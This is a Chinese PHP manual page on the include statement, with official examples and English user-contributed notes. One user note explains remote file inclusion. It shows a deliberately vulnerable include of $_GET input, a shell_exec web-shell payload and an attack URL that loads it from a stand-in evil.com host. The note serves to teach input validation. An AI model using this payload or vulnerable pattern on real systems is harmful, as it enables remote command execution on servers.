<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
 <head>
  <meta http-equiv="content-type" content="text/html; CHARSET=gb2312">
  <title>include</title>
<link media="all" rel="stylesheet" type="text/css" href="styles/03e73060321a0a848018724a6c83de7f-theme-base.css" />
<link media="all" rel="stylesheet" type="text/css" href="styles/03e73060321a0a848018724a6c83de7f-theme-medium.css" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <link media="all" rel="stylesheet" type="text/css" href="style.css"/>
 </head>
 <body class="docs" class="docs"><div class="navbar navbar-fixed-top">
  <div class="navbar-inner clearfix">
    <ul class="nav" style="width: 100%">
      <li style="float: left;"><a href="function.require.html">? require</a></li>
      <li style="float: right;"><a href="function.require-once.html">require_once ?</a></li>
    </ul>
  </div>
</div>
<div id="breadcrumbs" class="clearfix">
  <ul class="breadcrumbs-container">
    <li><a href="index.html">PHP Manual</a></li>
    <li><a href="language.control-structures.html">流程控制</a></li>
    <li>include</li>
  </ul>
</div>
<div id="layout">
  <div id="layout-content"><div id="function.include" class="sect1">
 <h2 class="title"><span class="function"><strong>include</strong></span></h2>
 <p class="verinfo">(PHP 4, PHP 5, PHP 7, PHP 8)</p>
 <p class="simpara">
  <code class="literal">include</code> 语句包含并运行指定文件。
 </p>
 <p class="simpara">
  以下文档也适用于 <span class="function"><a href="function.require.html" class="function">require</a></span>。
 </p>
 <p class="simpara">
  被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照
  <a href="ini.core.html#ini.include-path" class="link">include_path</a> 指定的目录寻找。如果在
  <a href="ini.core.html#ini.include-path" class="link">include_path</a> 下没找到该文件则
  <code class="literal">include</code> 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则
  <code class="literal">include</code> 结构会发出一条<a href="" class="link">警告</a>；这一点和
  <span class="function"><a href="function.require.html" class="function">require</a></span> 不同，后者会发出一个<a href="" class="link">致命错误</a>。
 </p>
 <p class="simpara">
  如果定义了路径&mdash;&mdash;不管是绝对路径（在 Windows
  下以盘符或者 <code class="literal">\</code> 开头，在 Unix/Linux
  下以 <code class="literal">/</code> 开头）还是当前目录的相对路径（以
  <code class="literal">.</code> 或者 <code class="literal">..</code> 开头）&mdash;&mdash;<a href="ini.core.html#ini.include-path" class="link">include_path</a> 都会被完全忽略。例如一个文件以
  <code class="literal">../</code> 开头，则解析器会在当前目录的父目录下寻找该文件。
 </p>
 <p class="simpara">
  有关 PHP 怎样处理包含文件和包含路径的更多信息参见
  <a href="ini.core.html#ini.include-path" class="link">include_path</a> 部分的文档。
 </p>
 <p class="simpara">
  当一个文件被包含时，其中所包含的代码继承了 include 所在行的<a href="language.variables.scope.html" class="link">变量范围</a>。从该处开始，调用文件在该行处可用的任何变量在被调用的文件中也都可用。不过所有在包含文件中定义的函数和类都具有全局作用域。
 </p>
 <p class="para">
  <div class="example" id="example-138">
   <p><strong>Example #1 基本的 <code class="literal">include</code> 例子</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'green'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$fruit&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'apple'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />test.php<br /><span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;A<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;A&nbsp;green&nbsp;apple<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  如果 include 出现于调用文件中的一个函数里，则被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样。所以它将遵循该函数的变量范围。此规则的一个例外是<a href="language.constants.predefined.html" class="link">魔术常量</a>，它们是在发生包含之前就已被解析器处理的。
 </p>
 <p class="para">
  <div class="example" id="example-139">
   <p><strong>Example #2 函数中的包含</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #007700">function&nbsp;</span><span style="color: #0000BB">foo</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">/*&nbsp;vars.php&nbsp;is&nbsp;in&nbsp;the&nbsp;scope&nbsp;of&nbsp;foo()&nbsp;so&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<br />&nbsp;*&nbsp;$fruit&nbsp;is&nbsp;NOT&nbsp;available&nbsp;outside&nbsp;of&nbsp;this&nbsp;&nbsp;*<br />&nbsp;*&nbsp;scope.&nbsp;&nbsp;$color&nbsp;is&nbsp;because&nbsp;we&nbsp;declared&nbsp;it&nbsp;*<br />&nbsp;*&nbsp;as&nbsp;global.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/<br /><br /></span><span style="color: #0000BB">foo</span><span style="color: #007700">();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;A&nbsp;green&nbsp;apple<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">"A&nbsp;</span><span style="color: #0000BB">$color</span><span style="color: #DD0000">&nbsp;</span><span style="color: #0000BB">$fruit</span><span style="color: #DD0000">"</span><span style="color: #007700">;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;A&nbsp;green<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML
  模式，到文件结尾处恢复。由于此原因，目标文件中需要作为
  PHP 代码执行的任何代码都必须被包括在<a href="language.basic-syntax.phpmode.html" class="link">有效的 PHP 起始和结束标记</a>之中。
 </p>
 <p class="simpara">
  如果"<a href="filesystem.configuration.html#ini.allow-url-include" class="link">URL include wrappers</a>"在
  PHP 中被激活，可以用 URL（通过 HTTP
  或者其它支持的封装协议&mdash;&mdash;见<a href="wrappers.html" class="xref">支持的协议和封装协议</a>）而不是本地文件来指定要被包含的文件。如果目标服务器将目标文件作为
  PHP 代码解释，则可以用适用于 HTTP GET 的 URL
  请求字符串来向被包括的文件传递变量。严格的说这和包含一个文件并继承父文件的变量空间并不是一回事；该脚本文件实际上已经在远程服务器上运行了，而本地脚本则包括了其结果。
 </p>
 <p class="para">
  <div class="example" id="example-140">
   <p><strong>Example #3 通过 HTTP 进行的 <code class="literal">include</code></strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br /></span><span style="color: #FF8000">/*&nbsp;This&nbsp;example&nbsp;assumes&nbsp;that&nbsp;www.example.com&nbsp;is&nbsp;configured&nbsp;to&nbsp;parse&nbsp;.php&nbsp;*<br />&nbsp;*&nbsp;files&nbsp;and&nbsp;not&nbsp;.txt&nbsp;files.&nbsp;Also,&nbsp;'Works'&nbsp;here&nbsp;means&nbsp;that&nbsp;the&nbsp;variables&nbsp;*<br />&nbsp;*&nbsp;$foo&nbsp;and&nbsp;$bar&nbsp;are&nbsp;available&nbsp;within&nbsp;the&nbsp;included&nbsp;file.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/<br /><br />//&nbsp;Won't&nbsp;work;&nbsp;file.txt&nbsp;wasn't&nbsp;handled&nbsp;by&nbsp;www.example.com&nbsp;as&nbsp;PHP<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'http://www.example.com/file.txt?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//&nbsp;Won't&nbsp;work;&nbsp;looks&nbsp;for&nbsp;a&nbsp;file&nbsp;named&nbsp;'file.php?foo=1&amp;bar=2'&nbsp;on&nbsp;the<br />//&nbsp;local&nbsp;filesystem.<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//&nbsp;Works.<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'http://www.example.com/file.php?foo=1&amp;bar=2'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">$foo&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$bar&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">2</span><span style="color: #007700">;<br />include&nbsp;</span><span style="color: #DD0000">'file.txt'</span><span style="color: #007700">;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;Works.<br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">'file.php'</span><span style="color: #007700">;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;Works.<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <div class="warning"><strong class="warning">Warning</strong>
  <h1 class="title">安全警告</h1>
  <p class="para">
   远程文件可能会经远程服务器处理（根据文件后缀以及远程服务器是否在运行
   PHP 而定），但必须产生出一个合法的 PHP
   脚本，因为其将被本地服务器处理。如果来自远程服务器的文件应该在远端运行而只输出结果，那用
   <span class="function"><a href="function.readfile.html" class="function">readfile()</a></span>
   函数更好。另外还要格外小心以确保远程的脚本产生出合法并且是所需的代码。
  </p>
 </div>
 <p class="para">
  相关信息参见<a href="features.remote-files.html" class="link">使用远程文件</a>，<span class="function"><a href="function.fopen.html" class="function">fopen()</a></span>
  和 <span class="function"><a href="function.file.html" class="function">file()</a></span>。
 </p>
 <p class="simpara">
  处理返回值：在失败时 <code class="literal">include</code> 返回 <code class="literal">FALSE</code>
  并且发出警告。成功的包含则返回
  <code class="literal">1</code>，除非在包含文件中另外给出了返回值。可以在被包括的文件中使用 <span class="function"><a href="function.return.html" class="function">return</a></span>
  语句来终止该文件中程序的执行并返回调用它的脚本。同样也可以从被包含的文件中返回值。可以像普通函数一样获得
  include 调用的返回值。不过这在包含远程文件时却不行，除非远程文件的输出具有<a href="language.basic-syntax.phpmode.html" class="link">合法的 PHP
  开始和结束标记</a>（如同任何本地文件一样）。可以在标记内定义所需的变量，该变量在文件被包含的位置之后就可用了。
 </p>
 <p class="para">
  因为 <code class="literal">include</code> 是一个特殊的语言结构，其参数不需要括号。在比较其返回值时要注意。
  <div class="example" id="example-141">
   <p><strong>Example #4 比较 include 的返回值</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">//&nbsp;won't&nbsp;work,&nbsp;evaluated&nbsp;as&nbsp;include(('vars.php')&nbsp;==&nbsp;TRUE),&nbsp;i.e.&nbsp;include('')<br /></span><span style="color: #007700">if&nbsp;(include(</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">TRUE</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">//&nbsp;works<br /></span><span style="color: #007700">if&nbsp;((include&nbsp;</span><span style="color: #DD0000">'vars.php'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">TRUE</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'OK'</span><span style="color: #007700">;<br />}<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="para">
  <div class="example" id="example-142">
   <p><strong>Example #5 <code class="literal">include</code> 和 <span class="function"><a href="function.return.html" class="function">return</a></span> 语句</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br />return&nbsp;</span><span style="color: #0000BB">$var</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />noreturn.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'PHP'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">?&gt;<br /></span><br />testreturns.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$foo&nbsp;</span><span style="color: #007700">=&nbsp;include&nbsp;</span><span style="color: #DD0000">'return.php'</span><span style="color: #007700">;<br /><br />echo&nbsp;</span><span style="color: #0000BB">$foo</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;prints&nbsp;'PHP'<br /><br /></span><span style="color: #0000BB">$bar&nbsp;</span><span style="color: #007700">=&nbsp;include&nbsp;</span><span style="color: #DD0000">'noreturn.php'</span><span style="color: #007700">;<br /><br />echo&nbsp;</span><span style="color: #0000BB">$bar</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">//&nbsp;prints&nbsp;1<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="simpara">
  <code class="literal">$bar</code> 的值为 <code class="literal">1</code> 是因为 include
  成功运行了。注意以上例子中的区别。第一个在被包含的文件中用了
  <span class="function"><a href="function.return.html" class="function">return</a></span> 而另一个没有。如果文件不能被包含，则返回
  <strong><code>false</code></strong> 并发出一个 <strong><code>E_WARNING</code></strong> 警告。
 </p>
 <p class="para">
  如果在包含文件中定义有函数，这些函数不管是在 <span class="function"><a href="function.return.html" class="function">return</a></span>
  之前还是之后定义的，都可以独立在主文件中使用。如果文件被包含两次，PHP 5
  发出致命错误因为函数已经被定义，但是 PHP 4 不会对在
  <span class="function"><a href="function.return.html" class="function">return</a></span> 之后定义的函数报错。推荐使用
  <span class="function"><a href="function.include-once.html" class="function">include_once</a></span> 而不是检查文件是否已包含并在包含文件中有条件返回。
 </p>
 <p class="simpara">
  另一个将 PHP 文件"包含"到一个变量中的方法是用<a href="ref.outcontrol.html" class="link">输出控制函数</a>结合
  <span class="function"><strong>include</strong></span> 来捕获其输出，例如：
 </p>
 <p class="para">
  <div class="example" id="example-143">
   <p><strong>Example #6 使用输出缓冲来将 PHP 文件包含入一个字符串</strong></p>
   <div class="example-contents">
<div class="phpcode"><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />$string&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'somefile.php'</span><span style="color: #007700">);<br /><br />function&nbsp;</span><span style="color: #0000BB">get_include_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #0000BB">is_file</span><span style="color: #007700">(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ob_start</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;</span><span style="color: #0000BB">$filename</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$contents&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ob_get_contents</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ob_end_clean</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">$contents</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></div>
   </div>

  </div>
 </p>
 <p class="para">
  要在脚本中自动包含文件，参见 <var class="filename">php.ini</var> 中的
  <a href="ini.core.html#ini.auto-prepend-file" class="link">auto_prepend_file</a> 和
  <a href="ini.core.html#ini.auto-append-file" class="link">auto_append_file</a>
  配置选项。
 </p>
 <blockquote class="note"><p><strong class="note">Note</strong>: <span class="simpara">因为是一个语言构造器而不是一个函数，不能被
<a href="functions.variable-functions.html" class="link">可变函数</a> 调用。
</span>
</p></blockquote>
 <p class="simpara">
  参见 <span class="function"><a href="function.require.html" class="function">require</a></span>，<span class="function"><a href="function.require-once.html" class="function">require_once</a></span>，<span class="function"><a href="function.include-once.html" class="function">include_once</a></span>，<span class="function"><a href="function.get-included-files.html" class="function">get_included_files()</a></span>，<span class="function"><a href="function.readfile.html" class="function">readfile()</a></span>，<span class="function"><a href="function.virtual.html" class="function">virtual()</a></span>
  和 <a href="ini.core.html#ini.include-path" class="link">include_path</a>。
 </p>
</div><div id="usernotes">
 <div class="head">
  <h3 class="title">User Contributed Notes</h3>
 </div>
<div id="allnotes">  <a name="122667""></a>
  <div class="note">
   <strong class="user">jbezorg at gmail dot com</strong>
   <a href="#122667" class="date">26-Apr-2018 02:34</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Ideally includes should be kept outside of the web root. That's not often possible though especially when distributing packaged applications where you don't know the server environment your application will be running in. In those cases I use the following as the first line.<br />
<br />
( __FILE__ != $_SERVER['SCRIPT_FILENAME'] ) or exit ( 'No' );</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="120925""></a>
  <div class="note">
   <strong class="user">ayon at hyurl dot com</strong>
   <a href="#120925" class="date">03-Apr-2017 06:24</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
It is also able to include or open a file from a zip file:<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include </span><span class="string">"something.zip#script.php"</span><span class="keyword">;<br />
echo </span><span class="default">file_get_contents</span><span class="keyword">(</span><span class="string">"something.zip#script.php"</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span>Note that instead of using / or \, open a file from a zip file uses # to separate zip name and inner file's name.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="120069""></a>
  <div class="note">
   <strong class="user">John Carty</strong>
   <a href="#120069" class="date">20-Oct-2016 08:29</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Before using php's include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).<br />
<br />
As example #3 points out, it is possible to include a php file from a remote server.<br />
<br />
The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation.&nbsp; Suppose you have an example.php with code:<br />
<br />
<span class="default">&lt;?php<br />
</span><span class="comment">// Bad Code<br />
</span><span class="default">$path </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'path'</span><span class="keyword">];<br />
include </span><span class="default">$path </span><span class="keyword">. </span><span class="string">'example-config-file.php'</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span><br />
As a programmer, you might expect the user to browse to the path that you specify.<br />
<br />
However, it opens up an RFI vulnerability.&nbsp; To exploit it as an attacker, I would first setup an evil text file with php code on my evil.com domain.<br />
<br />
evil.txt<br />
<span class="default">&lt;?php </span><span class="keyword">echo </span><span class="default">shell_exec</span><span class="keyword">(</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'command'</span><span class="keyword">]);</span><span class="default">?&gt;<br />
</span><br />
It is a text file so it would not be processed on my server but on the target/victim server.&nbsp; I would browse to:<br />
h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00<br />
<br />
The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.&nbsp; In this case, it is whoami.&nbsp; I ended the path variable with a %00, which is the null character.&nbsp; The original include statement in the example.php would ignore the rest of the line.&nbsp; It should tell me who the web server is running as.<br />
<br />
Please use proper input validation if you use variables in an include statement.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="118083""></a>
  <div class="note">
   <strong class="user">error17191 at gmail dot com</strong>
   <a href="#118083" class="date">01-Oct-2015 09:39</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
When including a file using its name directly without specifying we are talking about the current working directory, i.e. saying (include "file") instead of ( include "./file") . PHP will search first in the current working directory (given by getcwd() ) , then next searches for it in the directory of the script being executed (given by __dir__).<br />
This is an example to demonstrate the situation :<br />
We have two directory structure :<br />
-dir1<br />
----script.php<br />
----test<br />
----dir1_test<br />
-dir2<br />
----test<br />
----dir2_test<br />
<br />
dir1/test contains the following text :<br />
This is test in dir1<br />
dir2/test contains the following text:<br />
This is test in dir2<br />
dir1_test contains the following text:<br />
This is dir1_test<br />
dir2_test contains the following text:<br />
This is dir2_test<br />
<br />
script.php contains the following code:<br />
<span class="default">&lt;?php<br />
<br />
</span><span class="keyword">echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
include </span><span class="string">'test'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'Changing current working directory to dir2'</span><span class="keyword">;<br />
</span><span class="default">chdir</span><span class="keyword">(</span><span class="string">'../dir2'</span><span class="keyword">);<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
include </span><span class="string">'test'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "dir2_test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
include </span><span class="string">'dir2_test'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "dir1_test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
include </span><span class="string">'dir1_test'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
echo </span><span class="string">'including "./dir1_test" ...'</span><span class="keyword">;<br />
echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />
(@include </span><span class="string">'./dir1_test'</span><span class="keyword">) or die(</span><span class="string">'couldn\'t include this file '</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span>The output of executing script.php is :<br />
<br />
Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />
Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir1<br />
including "test" ...<br />
This is test in dir1<br />
Changing current working directory to dir2<br />
Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />
Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir2<br />
including "test" ...<br />
This is test in dir2<br />
including "dir2_test" ...<br />
This is dir2_test<br />
including "dir1_test" ...<br />
This is dir1_test<br />
including "./dir1_test" ...<br />
couldn't include this file</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="117011""></a>
  <div class="note">
   <strong class="user">Jero Minh</strong>
   <a href="#117011" class="date">01-Apr-2015 10:55</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Notice that using @include (instead of include without @) will set the local value of error_reporting to 0 inside the included script.<br />
<br />
Consider the following:<br />
<span class="default">&lt;?php<br />
&nbsp;&nbsp;&nbsp; ini_set</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">, </span><span class="default">E_ALL</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"Own value before: "</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"\r\n"</span><span class="keyword">;<br />
<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"include foo.php: "</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; include(</span><span class="string">'foo.php'</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"@include foo.php: "</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; @include(</span><span class="string">'foo.php'</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp;&nbsp; echo </span><span class="string">"Own value now: " </span><span class="keyword">. </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
foo.php<br />
<span class="default">&lt;?php<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">echo </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">) . </span><span class="string">"\r\n"</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span><br />
Output:<br />
&nbsp;&nbsp;&nbsp; Own value before: 32767<br />
&nbsp;&nbsp;&nbsp; include foo.php: 32767<br />
&nbsp;&nbsp;&nbsp; @include foo.php: 0<br />
&nbsp;&nbsp;&nbsp; Own value now: 32767</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="116522""></a>
  <div class="note">
   <strong class="user">Rash</strong>
   <a href="#116522" class="date">17-Jan-2015 05:55</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you want to have include files, but do not want them to be accessible directly from the client side, please, please, for the love of keyboard, do not do this:<br />
<br />
<span class="default">&lt;?php<br />
<br />
</span><span class="comment"># index.php<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'what'</span><span class="keyword">, </span><span class="string">'ever'</span><span class="keyword">);<br />
include </span><span class="string">'includeFile.php'</span><span class="keyword">;<br />
<br />
</span><span class="comment"># includeFile.php<br />
<br />
// check if what is defined and die if not<br />
<br />
</span><span class="default">?&gt;<br />
</span><br />
The reason you should not do this is because there is a better option available. Move the includeFile(s) out of the document root of your project. So if the document root of your project is at "/usr/share/nginx/html", keep the include files in "/usr/share/nginx/src".<br />
<br />
<span class="default">&lt;?php<br />
<br />
</span><span class="comment"># index.php (in document root (/usr/share/nginx/html))<br />
<br />
</span><span class="keyword">include </span><span class="default">__DIR__ </span><span class="keyword">. </span><span class="string">'/../src/includeFile.php'</span><span class="keyword">;<br />
<br />
</span><span class="default">?&gt;<br />
</span><br />
Since user can't type 'your.site/../src/includeFile.php', your includeFile(s) would not be accessible to the user directly.</span>
</code>
    </div>
   </div>
